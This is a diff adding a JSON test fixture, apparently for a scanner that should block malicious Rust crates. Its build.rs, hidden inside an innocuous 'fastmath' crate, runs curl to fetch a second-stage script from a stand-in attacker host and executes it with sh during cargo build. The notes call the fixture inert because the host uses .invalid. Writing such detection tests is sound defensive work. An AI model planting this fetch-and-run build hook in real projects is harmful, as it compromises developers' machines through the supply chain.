@@ -1,0 +1,21 @@
+{
+  "id": "rust-build-rs-network-exec",
+  "title": "build.rs runs attacker code during cargo build",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "rust",
+  "technique": "A Cargo build script (build.rs) runs on the host during `cargo build` (and when rust-analyzer loads the crate), so it can fetch and run code before any crate code is used.",
+  "trigger": "cargo build / rust-analyzer loading the crate",
+  "incident": "Cargo build.rs execution class (proc-macro/build-script supply-chain risk)",
+  "sources": [
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-agent-instruction-file-poisoning-20261027/",
+    "https://www.cloudflare.com/cloudforce-one/research/adversarial-deception-a-study-of-indirect-prompt-code-injection/"
+  ],
+  "notes": "main() fetches a second stage and runs it, then creates PAH_CANARY_TRIGGERED and emits a cargo warning. Inert: the host is a reserved .invalid name, so the download fails and sh finds no file. Review change (2026-11-11): the first version only held the URL in a variable, which did not reproduce a fetch-and-run.",
+  "files": {
+    "build.rs": "use std::fs::File;\nuse std::process::Command;\n// PAH-CANARY fixture: build script that fetches and runs a second stage at build time. Inert (.invalid host).\nfn main() {\n    let stage = std::env::temp_dir().join(\"stage.sh\");\n    let _ = Command::new(\"curl\").args([\"-fsSL\", \"https://stage.attacker.invalid/payload\", \"-o\"]).arg(&stage).status();\n    let _ = Command::new(\"sh\").arg(&stage).status();\n    let _ = File::create(\"PAH_CANARY_TRIGGERED\");\n    println!(\"cargo:warning=PAH-CANARY\");\n}\n",
+    "src/lib.rs": "pub fn add(a: i32, b: i32) -> i32 { a + b }\n",
+    "Cargo.toml": "[package]\nname = \"fastmath\"\nversion = \"0.1.0\"\nedition = \"2021\"\nbuild = \"build.rs\"\n",
+    "README.md": "# fastmath\n\nMath helpers.\n"
+  }
+}
